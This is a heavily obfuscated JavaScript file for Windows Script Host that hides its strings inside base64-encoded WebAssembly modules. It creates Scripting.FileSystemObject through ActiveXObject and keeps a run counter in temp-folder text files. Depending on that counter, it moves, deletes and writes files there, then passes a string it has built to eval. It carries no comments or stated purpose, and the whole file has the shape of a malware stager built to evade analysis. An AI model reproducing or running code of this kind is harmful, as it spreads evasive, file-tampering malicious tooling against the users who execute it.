const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGh4SAgABXfwBBAQt/AEEEC38AQSALfwBBPAt/AEH+AAt/AEGKAQt/AEGMAQt/AEGSAQt/AEGoAQt/AEGuAQt/AEHEAQt/AEHKAQt/AEHgAQt/AEHmAQt/AEH4AQt/AEH+AQt/AEGQAgt/AEGWAgt/AEGqAgt/AEGwAgt/AEHIAgt/AEHOAgt/AEHmAgt/AEH+Agt/AEGEAwt/AEGcAwt/AEGiAwt/AEG6Awt/AEHAAwt/AEHYAwt/AEHeAwt/AEH2Awt/AEH8Awt/AEGUBAt/AEGaBAt/AEGyBAt/AEG4BAt/AEHQBAt/AEHWBAt/AEHuBAt/AEH0BAt/AEGMBQt/AEGSBQt/AEGsBQt/AEGyBQt/AEHMBQt/AEHSBQt/AEHsBQt/AEHyBQt/AEGQBgt/AEGWBgt/AEG4Bgt/AEG+Bgt/AEHgBgt/AEHmBgt/AEGKBwt/AEGQBwt/AEG0Bwt/AEG6Bwt/AEHOBwt/AEHUBwt/AEHoBwt/AEHuBwt/AEGCCAt/AEGICAt/AEGcCAt/AEGiCAt/AEGkCAt/AEGqCAt/AEGsCAt/AEGyCAt/AEG0CAt/AEG8CAt/AEG+CAt/AEHECAt/AEHYCAt/AEHeCAt/AEH2CAt/AEGCCQt/AEGICQt/AEGgCQt/AEGmCQt/AEG+CQt/AEHECQt/AEHcCQt/AEHoCQt/AEH4CQsHj4aAgABYBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxEGZGF0YTE4AxIGZGF0YTE5AxMGZGF0YTIwAxQGZGF0YTIxAxUGZGF0YTIyAxYGZGF0YTIzAxcGZGF0YTI0AxgGZGF0YTI1AxkGZGF0YTI2AxoGZGF0YTI3AxsGZGF0YTI4AxwGZGF0YTI5Ax0GZGF0YTMwAx4GZGF0YTMxAx8GZGF0YTMyAyAGZGF0YTMzAyEGZGF0YTM0AyIGZGF0YTM1AyMGZGF0YTM2AyQGZGF0YTM3AyUGZGF0YTM4AyYGZGF0YTM5AycGZGF0YTQwAygGZGF0YTQxAykGZGF0YTQyAyoGZGF0YTQzAysGZGF0YTQ0AywGZGF0YTQ1Ay0GZGF0YTQ2Ay4GZGF0YTQ3Ay8GZGF0YTQ4AzAGZGF0YTQ5AzEGZGF0YTUwAzIGZGF0YTUxAzMGZGF0YTUyAzQGZGF0YTUzAzUGZGF0YTU0AzYGZGF0YTU1AzcGZGF0YTU2AzgGZGF0YTU3AzkGZGF0YTU4AzoGZGF0YTU5AzsGZGF0YTYwAzwGZGF0YTYxAz0GZGF0YTYyAz4GZGF0YTYzAz8GZGF0YTY0A0AGZGF0YTY1A0EGZGF0YTY2A0IGZGF0YTY3A0MGZGF0YTY4A0QGZGF0YTY5A0UGZGF0YTcwA0YGZGF0YTcxA0cGZGF0YTcyA0gGZGF0YTczA0kGZGF0YTc0A0oGZGF0YTc1A0sGZGF0YTc2A0wGZGF0YTc3A00GZGF0YTc4A04GZGF0YTc5A08GZGF0YTgwA1AGZGF0YTgxA1EGZGF0YTgyA1IGZGF0YTgzA1MGZGF0YTg0A1QGZGF0YTg1A1UGZGF0YTg2A1YL+YyAgABXAEEBCwEAAEEECxtTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdAAAQSALG1NjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0AABBPAtAZmRjZWZmYmJiZmNlZWVhY2QlMjAlM0QlMjAlMjBmYWVjZGFkZWJiZS5SZWFlYmZiZWZmZWNjZEFsbCgpJTNCAABB/gALC2ViZmJlZmZlY2MAAEGKAQsBAABBjAELBCUyRgAAQZIBCxViY2VkYmNjYmNmY2ZmZWVyLnR4dAAAQagBCwQlMkYAAEGuAQsVYmNlZGJjY2JjZmNmZmVlci50eHQAAEHEAQsEJTJGAABBygELFWJjZWRiY2NiY2ZjZmZlZXIudHh0AABB4AELBCUyRgAAQeYBCxFiZWZlYWFjYmFmZGQudHh0AABB+AELBCUyRgAAQf4BCxFiZWZlYWFjYmFmZGQudHh0AABBkAILBCUyRgAAQZYCCxNiZGVmZWNiZWFhZGNjZS50eHQAAEGqAgsEJTJGAABBsAILFnNkNDNzYmVmZWFhY2JhZmRkLnR4dAAAQcgCCwQlMkYAAEHOAgsWc2Q0M3NiZWZlYWFjYmFmZGQudHh0AABB5gILFzFzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEH+AgsEJTJGAABBhAMLFzFzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEGcAwsEJTJGAABBogMLFzJzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEG6AwsEJTJGAABBwAMLFzJzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEHYAwsEJTJGAABB3gMLFzNzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEH2AwsEJTJGAABB/AMLFzNzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEGUBAsEJTJGAABBmgQLFzRzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEGyBAsEJTJGAABBuAQLFzRzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEHQBAsEJTJGAABB1gQLFzVzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEHuBAsEJTJGAABB9AQLFzVzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEGMBQsEJTJGAABBkgULGDZzc2Qzc3NiZWZlYWFjYmFmZGQudHh0AABBrAULBCUyRgAAQbIFCxg2c3NkM3NzYmVmZWFhY2JhZmRkLnR4dAAAQcwFCwQlMkYAAEHSBQsYNnNzZDNzc2JlZmVhYWNiYWZkZC50eHQAAEHsBQsEJTJGAABB8gULHGFzZGRkc2RmMnNzYmVmZWFhY2JhZmRkLnR4dAAAQZAGCwQlMkYAAEGWBgsgYXNkZGRkZHNkZjJzZGRzYmVmZWFhY2JhZmRkLnR4dAAAQbgGCwQlMkYAAEG+BgsgYXNkZGRkZHNkZjJzZGRzYmVmZWFhY2JhZmRkLnR4dAAAQeAGCwQlMkYAAEHmBgsjYXNzZGRkZGRkc3NkZjJzZGRzYmVmZWFhY2JhZmRkLnR4dAAAQYoHCwQlMkYAAEGQBwsjYXNzZGRkZGRkc3NkZjJzZGRzYmVmZWFhY2JhZmRkLnR4dAAAQbQHCwQlMkYAAEG6BwsSYWRlY2ZiZmNjY2ZmYy50eHQAAEHOBwsEJTJGAABB1AcLEmFkZWNmYmZjY2NmZmMudHh0AABB6AcLBCUyRgAAQe4HCxJhZGVjZmJmY2NjZmZjLnR4dAAAQYIICwQlMkYAAEGICAsSYWRlY2ZiZmNjY2ZmYy50eHQAAEGcCAsFLS0tLQAAQaIICwEAAEGkCAsFJTJGKgAAQaoICwEAAEGsCAsFKiUyRgAAQbIICwEAAEG0CAsHJTJGJTJGAABBvAgLAQAAQb4ICwQlMkYAAEHECAsTYmRlZmVjYmVhYWRjY2UudHh0AABB2AgLBCUyRgAAQd4ICxZzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEH2CAsLZWJkZmFkZWZkYwAAQYIJCwQlMkYAAEGICQsWc2Q0M3NiZWZlYWFjYmFmZGQudHh0AABBoAkLBCUyRgAAQaYJCxZzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEG+CQsEJTJGAABBxAkLFzFzZDQzc2JlZmVhYWNiYWZkZC50eHQAAEHcCQsLZWJkZmFkZWZkYwAAQegJCw5BY3RpdmVYT2JqZWN0AABB+AkLBWV2YWwA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var fabebfddccbcbc = lS(0, 0);
var baeeabcbfaab = [];
var fdbbccbfdeabad;
var aefaeccdfab = new window[(lS(0, 85, true))](lS(0, 1));
var cdbfebedcfdf = aefaeccdfab.GetSpecialFolder(2);
function bfddcade() {
    var aaffecbefaeb = new window[(lS(0, 85, true))](lS(0, 2));
    var faecdadebbe = aaffecbefaeb.OpenTextFile(WScript.ScriptFullName, 1);
    var fdceffbbbfceeeacd;
    var defeedffeabdd = lS(0, 3);
    window[lS(0, 86, true)](defeedffeabdd.replace(lS(0, 4), lS(0, 5)));
    (() => {
        const __callInstance23 = new WebAssembly.Instance(__callWasmModule, {
            env: {
                impFunc: () => {
                    faecdadebbe.Close();
                }
            }
        });
        const __exports = __callInstance23.exports;
        return __exports.data();
    })();
    return fdceffbbbfceeeacd;
}
var bcedbccbcfcffe = 0;
var dadfaccabf = aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 6) + lS(0, 7));
(() => {
    const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    var efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + lS(0, 8) + lS(0, 9), 1, 1);
                    bcedbccbcfcffe = efaeabeedeeadc.ReadAll();
                    (() => {
                        const __callInstance22 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    efaeabeedeeadc.Close();
                                }
                            }
                        });
                        const __exports = __callInstance22.exports;
                        return __exports.data();
                    })();
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance0.exports;
    return __exports.data(dadfaccabf == true ? 1 : 0);
})();
bcedbccbcfcffe = parseInt(bcedbccbcfcffe) + 1;
efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + lS(0, 10) + lS(0, 11), 2, 1);
(() => {
    const __callInstance21 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                efaeabeedeeadc.WriteLine(bcedbccbcfcffe);
            }
        }
    });
    const __exports = __callInstance21.exports;
    return __exports.data();
})();
(() => {
    const __callInstance20 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                efaeabeedeeadc.Close();
            }
        }
    });
    const __exports = __callInstance20.exports;
    return __exports.data();
})();
var daccdffac = bfddcade();
(() => {
    const __ifInstance1 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + lS(0, 12) + lS(0, 13), 2, 1);
                    (() => {
                        const __callInstance19 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    efaeabeedeeadc.WriteLine(bcedbccbcfcffe);
                                }
                            }
                        });
                        const __exports = __callInstance19.exports;
                        return __exports.data();
                    })();
                    (() => {
                        const __callInstance18 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    efaeabeedeeadc.Close();
                                }
                            }
                        });
                        const __exports = __callInstance18.exports;
                        return __exports.data();
                    })();
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance1.exports;
    return __exports.data(bcedbccbcfcffe == 4 ? 1 : 0);
})();
(() => {
    const __ifInstance2 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    (() => {
                        const __callInstance17 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    aefaeccdfab.MoveFile(cdbfebedcfdf + lS(0, 14) + lS(0, 15), cdbfebedcfdf + lS(0, 16) + lS(0, 17));
                                }
                            }
                        });
                        const __exports = __callInstance17.exports;
                        return __exports.data();
                    })();
                    (() => {
                        const __ifInstance3 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance16 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 20) + lS(0, 21));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance16.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance3.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 18) + lS(0, 19)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance4 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance15 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 23) + lS(0, 24));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance15.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance4.exports;
                        return __exports.data(aefaeccdfab.FileExists(lS(0, 22)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance5 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance14 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 27) + lS(0, 28));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance14.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance5.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 25) + lS(0, 26)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance6 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance13 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 31) + lS(0, 32));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance13.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance6.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 29) + lS(0, 30)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance7 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance12 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 35) + lS(0, 36));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance12.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance7.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 33) + lS(0, 34)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance8 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance11 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 39) + lS(0, 40));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance11.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance8.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 37) + lS(0, 38)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance9 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance10 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 43) + lS(0, 44));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance10.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance9.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 41) + lS(0, 42)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance10 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance9 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 47) + lS(0, 48));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance9.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance10.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 45) + lS(0, 46)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance11 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance8 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 51) + lS(0, 52));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance8.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance11.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 49) + lS(0, 50)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance12 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance7 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 55) + lS(0, 56));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance7.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance12.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 53) + lS(0, 54)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance13 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance6 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 59) + lS(0, 60));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance6.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance13.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 57) + lS(0, 58)) ? 1 : 0);
                    })();
                    (() => {
                        const __ifInstance14 = new WebAssembly.Instance(__ifWasmModule, {
                            env: {
                                impFunc1: () => {
                                    (() => {
                                        const __callInstance5 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 63) + lS(0, 64));
                                                }
                                            }
                                        });
                                        const __exports = __callInstance5.exports;
                                        return __exports.data();
                                    })();
                                },
                                impFunc2: () => {
                                }
                            }
                        });
                        const __exports = __ifInstance14.exports;
                        return __exports.data(aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 61) + lS(0, 62)) ? 1 : 0);
                    })();
                    daccdffac = daccdffac.split(lS(0, 65)).join(lS(0, 66)).replace(lS(0, 67), lS(0, 68)).replace(lS(0, 69), lS(0, 70)).replace(lS(0, 71), lS(0, 72));
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance2.exports;
    return __exports.data(bcedbccbcfcffe == 5 ? 1 : 0);
})();
var dadfaccabf = aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 73) + lS(0, 74));
(() => {
    const __ifInstance15 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    window[lS(0, 86, true)](daccdffac);
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance15.exports;
    return __exports.data(dadfaccabf == true ? 1 : 0);
})();
efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + lS(0, 75) + lS(0, 76), 2, 1);
(() => {
    const __callInstance4 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                efaeabeedeeadc.WriteLine(lS(0, 77));
            }
        }
    });
    const __exports = __callInstance4.exports;
    return __exports.data();
})();
(() => {
    const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                efaeabeedeeadc.Close();
            }
        }
    });
    const __exports = __callInstance3.exports;
    return __exports.data();
})();
var dadfaccabfx = aefaeccdfab.FileExists(cdbfebedcfdf + lS(0, 78) + lS(0, 79));
(() => {
    const __ifInstance16 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    (() => {
                        const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    aefaeccdfab.DeleteFile(cdbfebedcfdf + lS(0, 80) + lS(0, 81));
                                }
                            }
                        });
                        const __exports = __callInstance2.exports;
                        return __exports.data();
                    })();
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance16.exports;
    return __exports.data(dadfaccabf !== false ? 1 : 0);
})();
efaeabeedeeadc = aefaeccdfab.OpenTextFile(cdbfebedcfdf + lS(0, 82) + lS(0, 83), 2, 1);
(() => {
    const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                efaeabeedeeadc.WriteLine(lS(0, 84));
            }
        }
    });
    const __exports = __callInstance1.exports;
    return __exports.data();
})();
(() => {
    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                efaeabeedeeadc.Close();
            }
        }
    });
    const __exports = __callInstance0.exports;
    return __exports.data();
})();
window[lS(0, 86, true)](daccdffac);